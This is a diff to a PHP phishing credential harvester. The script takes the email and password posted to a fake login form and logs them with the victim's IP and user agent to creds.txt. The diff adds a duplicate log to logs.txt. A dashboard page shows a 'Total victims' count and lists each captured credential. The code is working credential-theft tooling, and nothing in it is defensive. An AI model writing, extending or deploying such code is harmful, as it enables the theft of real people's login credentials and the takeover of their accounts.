@@ -5,20 +5,12 @@ if ($_POST) {
     $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
     $ua = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 100);
     $time = date('Y-m-d H:i:s');
-    
     $log = "[{$time}] 🎣 {$email}:{$pass} | 💻 IP:{$ip} | 📱 UA:{$ua}\n";
     file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
-    
+    file_put_contents('logs.txt', $log, FILE_APPEND | LOCK_EX); // ← AJOUTÉ
     header('Location: terminal.php?newhit=1');
     exit;
 }
-?>
-
-<?php
-$session_id = $argv[1];
-// Check si quelqu'un a visité index.php?session=$session_id
-// Retourne : "IP:1.2.3.4 | User-Agent: Chrome | Time: now"
-// Ou vide si pas d'interaction
 ?>
 <!DOCTYPE html>
 <html>
@@ -51,7 +43,6 @@ $session_id = $argv[1];
             $lines = array_filter(explode("\n", $logs));
             $count = count($lines);
             echo "<div>📊 Total victims: <span style='color:#ff0'>{$count}</span></div>";
-            
             foreach (array_reverse($lines) as $line) {
                 if (trim($line)) {
                     echo "<div class='hit'>{$line}</div>";
@@ -74,3 +65,4 @@ $session_id = $argv[1];
     </script>
 </body>
 </html>
+
